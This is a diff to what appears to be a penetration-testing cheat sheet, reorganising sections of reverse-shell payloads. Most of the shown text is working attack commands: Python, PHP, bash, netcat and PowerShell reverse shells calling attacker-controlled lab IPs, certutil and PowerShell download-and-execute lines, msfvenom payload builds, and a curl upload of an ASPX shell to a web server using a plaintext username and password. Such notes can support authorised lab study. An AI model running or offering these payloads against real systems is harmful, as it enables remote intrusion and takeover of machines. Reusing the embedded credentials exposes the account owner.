@@ -416,20 +416,21 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.66",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.226",8091));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
-````
+```
+##### PHP
 ```bash
-PHP 
 <?php $cmd = shell_exec('bash -i >& /dev/tcp/192.168.119.155/4444 0>&1'); echo $cmd;?> 
 <?php $cmd = shell_exec('cmd /c \\192.168.119.155\test\nc.exe -e cmd.exe 192.168.119.155 4444'); echo $cmd;?> 
-
-LINUX
+```
+##### LINUX
+```bash
 bash -i >& /dev/tcp/192.168.119.136/4444 0>&1  
 mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i |nc 192.168.119.155 4444 >/tmp/f2 
 nc -e /bin/bash 192.168.119.1136 4444
 /bin/sh -i 2>&1|nc 192.168.119.136 80
-
-WINDOWS
-certutil -urlcache -f http://192.168.119.136/nc.exe nc.exe & nc.exe -e cmd.exe 192.168.119.155 4444
+```
+##### WINDOWS
+```bash certutil -urlcache -f http://192.168.119.136/nc.exe nc.exe & nc.exe -e cmd.exe 192.168.119.155 4444
 certutil -urlcache -f http://192.168.119.155/shell.exe shell.exe & shell.exe
 powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp.ps1')"
 powershell -exec bypass -c "iwr('http://192.168.119.136/Invoke-PowerShellTcp.ps1')|iex"
@@ -439,9 +440,14 @@ powershell -exec bypass -c "iwr('http://192.168.119.136/Invoke-PowerShellTcp.ps1
 Unstaged
 msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf  
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe 
-
 ```
-
+##### ASPX-EXE
+```
+***ASPX needs -exe on it or it wont run. Go figure.
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.49.137 LPORT=445 -f aspx-exe -o shell42069.aspx
+***See if you can add it to the WEBDEV server with creds or not***
+curl -T '/home/bruiser/Tools/shell42069yolo.aspx' 'http://192.168.137.122/' -u fmcsorley:CrabSharkJellyfish192
+```
 # BUFFER OVERFLOW 
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
